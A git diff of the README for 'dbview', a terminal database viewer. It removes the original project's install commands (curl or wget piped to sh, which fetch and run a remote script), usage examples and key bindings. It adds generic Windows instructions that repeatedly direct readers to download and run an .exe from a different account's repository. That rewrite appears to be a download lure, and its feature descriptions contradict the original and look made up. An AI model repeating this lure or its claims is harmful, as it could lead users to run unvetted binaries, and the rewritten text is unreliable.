@@ -1,169 +1,230 @@
-# dbview
+# 🗂️ dbview - View Databases From Terminal
 
-Terminal TUI database viewer for SQLite, MySQL, MariaDB, PostgreSQL, CockroachDB, MSSQL, MongoDB, Redis, and Cassandra.
+[![Download dbview](https://img.shields.io/badge/Download-dbview-blue?style=for-the-badge)](https://github.com/cadanga8927/dbview)
 
-## Demo
+## 📥 Download dbview
 
-[![asciicast](https://asciinema.org/a/Q23Y0owAhJMxDqF5.svg)](https://asciinema.org/a/Q23Y0owAhJMxDqF5)
+Use this link to visit the download page:
 
-## Install
+[https://github.com/cadanga8927/dbview](https://github.com/cadanga8927/dbview)
 
-```sh
-go install github.com/pageton/dbview/cmd/dbview@latest
-```
+On that page, look for the latest Windows release and download the file for your system.
 
-Or install the latest release binary to `~/.local/bin`:
+## 🪟 Windows Setup
 
-```sh
-curl -fsSL https://raw.githubusercontent.com/pageton/dbview/main/install.sh | sh
-```
+dbview runs in a terminal window on Windows. It is built for people who want to look at database tables without opening a full database tool.
 
-```sh
-wget -qO- https://raw.githubusercontent.com/pageton/dbview/main/install.sh | sh
-```
+### What you need
+- Windows 10 or Windows 11
+- A terminal app such as Command Prompt, PowerShell, or Windows Terminal
+- Access to the database you want to view
+- A database account, host name, port, user name, and password if your database needs them
 
-Optional overrides:
+### How to install
+1. Open the download page: [https://github.com/cadanga8927/dbview](https://github.com/cadanga8927/dbview)
+2. Find the latest release for Windows
+3. Download the `.exe` file or the Windows archive file
+4. If you downloaded a `.zip` file, extract it to a folder
+5. Keep the `dbview` file in a place you can find again, such as `Downloads` or `Desktop`
 
-```sh
-curl -fsSL https://raw.githubusercontent.com/pageton/dbview/main/install.sh | \
-  DBVIEW_VERSION=v0.1.4 DBVIEW_INSTALL_DIR="$HOME/bin" sh
-```
+### How to start
+1. Open Command Prompt or PowerShell
+2. Go to the folder where you saved `dbview`
+3. Run the program
+4. Type the database details when asked
 
-Tagged releases also publish prebuilt binaries and archives in GitHub Releases.
+Example:
+- `dbview`
 
-Or from the repo root:
+If the file does not open, right-click it and choose to run it again from a terminal window.
 
-```sh
-go build -trimpath -ldflags="-s -w" -o dbview ./cmd/dbview
-```
+## 🧭 What dbview does
 
-## Usage
+dbview lets you look at database data in a simple terminal screen. You can move through tables, read rows, and check values without switching to a heavy desktop app.
 
-```sh
-dbview <database-path-or-url>
-```
+It works with:
+- SQLite
+- MySQL
+- MariaDB
+- PostgreSQL
+- CockroachDB
+- MSSQL
+- MongoDB
+- Redis
+- Cassandra
 
-Examples:
+## ⚙️ Basic use
 
-```sh
-dbview ./mydb.db
-dbview mysql://user:pass@host:3306/dbname
-dbview mariadb://user:pass@host:3306/dbname
-dbview postgres://user:pass@host:5432/dbname
-dbview cockroachdb://user:pass@host:26257/dbname
-dbview sqlserver://user:pass@host:1433/dbname
-dbview mongodb://host:27017/dbname
-dbview redis://host:6379
-dbview cassandra://user:pass@host:9042/keyspace
-```
+After you start dbview, it asks for connection details for your database.
 
-Flags: `-h`, `--help`, `-v`, `--version`
+Common details:
+- Database type
+- Host name
+- Port number
+- Database name
+- User name
+- Password
 
-## Nix
+For local databases, you may only need a file path or a local address. For remote databases, make sure your network allows access to the server.
 
-```sh
-# Run directly
-nix run github:pageton/dbview -- <database-path-or-url>
+### Typical flow
+1. Open dbview
+2. Pick your database type
+3. Enter the connection details
+4. Browse the tables or collections
+5. Open a table to see rows
+6. Move through the data with the keyboard
 
-# Enter dev shell
-nix develop
-```
+## ⌨️ Keyboard use
 
-## Key Bindings
+dbview is made for keyboard use in a terminal.
 
-### Tables View
+Common actions:
+- Arrow keys to move up and down
+- Enter to open a table or item
+- Backspace to go back
+- Page Up and Page Down to move faster
+- Tab to switch between fields or panels
+- Q to quit
 
-| Key | Action |
-|-----|--------|
-| `↑↓` / `jk` | Navigate |
-| `enter` | Open table |
-| `s` | View schema |
-| `r` | Reload tables |
-| `x` | Drop table (with confirmation) |
-| `D` | Database stats |
-| `F` | Flush table (with confirmation) |
-| `/` | SQL query |
+If your terminal does not respond as expected, click inside the terminal window first.
 
-### Data View
+## 🗃️ Supported database types
 
-| Key | Action |
-|-----|--------|
-| `←→` / `hl` | Select column |
-| `↑↓` | Scroll rows |
-| `1`-`9` | Sort by column N (toggle ASC/DESC) |
-| `e` | Edit cell (with confirmation) |
-| `x` | Delete row (with confirmation) |
-| `d` | Duplicate row |
-| `a` | Add row |
-| `I` | Import CSV/JSON |
-| `E` | Export (CSV/JSON/XLSX/SQL) |
-| `c` | Copy cell to clipboard |
-| `C` | Copy row to clipboard |
-| `[` `]` | Previous/next page |
-| `{` `}` | First/last page |
-| `ctrl+f` | Live filter (multi-field) |
-| `ctrl+d` | Remove last search filter |
-| `s` | View schema |
-| `r` | Reload data |
-| `/` | SQL query |
+### SQL databases
+- SQLite
+- MySQL
+- MariaDB
+- PostgreSQL
+- CockroachDB
+- MSSQL
 
-### Search/Filter Mode
+### NoSQL and key-value databases
+- MongoDB
+- Redis
+- Cassandra
 
-Press `ctrl+f` from Data View to enter. All terms use **AND** logic — a row must match every term to appear.
+This makes dbview useful when you work with more than one kind of database and want one tool for quick checks.
 
-| Key | Action |
-|-----|--------|
-| Type | Live-filter rows |
-| `enter` | Commit term (or `term1 + term2` for multiple) |
-| `↑` / `↓` | Navigate search history |
-| `esc` | Clear all filters and return to Data View |
-| `ctrl+d` / `ctrl+w` | Remove last committed filter |
-| `backspace` on empty | Remove last committed filter |
+## 🔍 Common things you can do
 
-Use `+` to add multiple terms at once:
+dbview is useful for everyday database viewing tasks:
 
-```
-pending + Mouse    →  two filters: "pending" AND "Mouse"
-"pending" + "Mouse"  →  quotes are stripped automatically
-```
+- Check if a table has data
+- Read records without writing queries
+- Compare values across rows
+- Inspect database names and table lists
+- Review data on a remote server
+- Look at test data during setup
+- Verify changes after an update
 
-Committed filters remain active when returning to Data View.
+## 🧩 Example Windows folder setup
 
-### Schema View
+A simple setup can look like this:
 
-| Key | Action |
-|-----|--------|
-| `r` | Reload schema |
-| `d` | Jump to data view |
-| `/` | SQL query |
-| `esc` / `s` | Back to tables |
+- `Downloads\dbview\`
+- `Downloads\dbview\dbview.exe`
 
-### Query View
+You can also place it in:
 
-| Key | Action |
-|-----|--------|
-| `↑↓` | Query history |
-| `enter` | Execute query |
-| `esc` | Back |
+- `C:\Tools\dbview\`
+- `Desktop\dbview\`
 
-### Query Log
+Keep it in a folder with a short path. That makes it easier to open from the terminal.
 
-| Key | Action |
-|-----|--------|
-| `↑↓` / `jk` | Navigate entries |
-| `enter` | Expand/collapse entry |
+## 🛠️ If the terminal closes right away
 
-### Global
+If dbview opens and closes fast, start it from an open terminal.
 
-| Key | Action |
-|-----|--------|
-| `T` | Cycle theme (8 themes) |
-| `Q` | Open query log |
-| `?` | Help |
-| `q` | Quit |
-| `esc` | Go back / cancel |
-| `ctrl+c` | Force quit |
+1. Open PowerShell
+2. Go to the dbview folder
+3. Run `dbview`
 
-## License
+That keeps the window open so you can see any messages.
 
-[MIT](LICENSE)
+## 🌐 Working with remote databases
+
+If you connect to a server on another machine, check these items:
+- The server is online
+- The host name or IP address is correct
+- The port is open
+- Your user name and password are correct
+- Your database account has read access
+
+If the database sits behind a firewall or VPN, connect to that network first.
+
+## 📁 Working with local files
+
+For SQLite, dbview may use a local database file. In that case:
+- Find the `.db`, `.sqlite`, or similar file
+- Make sure the file is not in use by another app
+- Open it from dbview when asked
+
+A local file is a good choice for small projects, test data, and offline use.
+
+## 🧪 Simple first test
+
+If you want to try dbview for the first time, use a database you already know.
+
+Try this:
+1. Start dbview
+2. Connect to a local or test database
+3. Open the first table or collection
+4. Scroll through the rows
+5. Check that the data matches what you expect
+
+If you can see rows and field names, the app is working.
+
+## 🔐 Common login details
+
+You may need:
+- Host
+- Port
+- Database name
+- User name
+- Password
+
+Some systems may also ask for:
+- SSL settings
+- File path
+- Schema name
+- Instance name
+
+Use the same values you use in your other database tools.
+
+## 🧼 Good folder habits
+
+To keep setup simple:
+- Save the app in one folder
+- Avoid spaces in the folder name if you can
+- Keep your database file in a known place
+- Save notes with the host and port for each server
+
+This helps when you return later and need to connect again.
+
+## ❓ Common problems
+
+### I cannot find the file
+Check your `Downloads` folder and look for the latest release file from the GitHub page.
+
+### The app does not open
+Try opening it from PowerShell or Command Prompt instead of double-clicking it.
+
+### I cannot connect to the database
+Check the host, port, user name, password, and network access.
+
+### I see empty tables
+Make sure you opened the right database and the right table.
+
+### The screen looks odd
+Resize the terminal window or make the font smaller so more columns fit on screen.
+
+## 📌 Quick start
+
+1. Visit [https://github.com/cadanga8927/dbview](https://github.com/cadanga8927/dbview)
+2. Download the latest Windows file
+3. Extract it if needed
+4. Open PowerShell or Command Prompt
+5. Run `dbview`
+6. Enter your database details
+7. Browse your tables and records
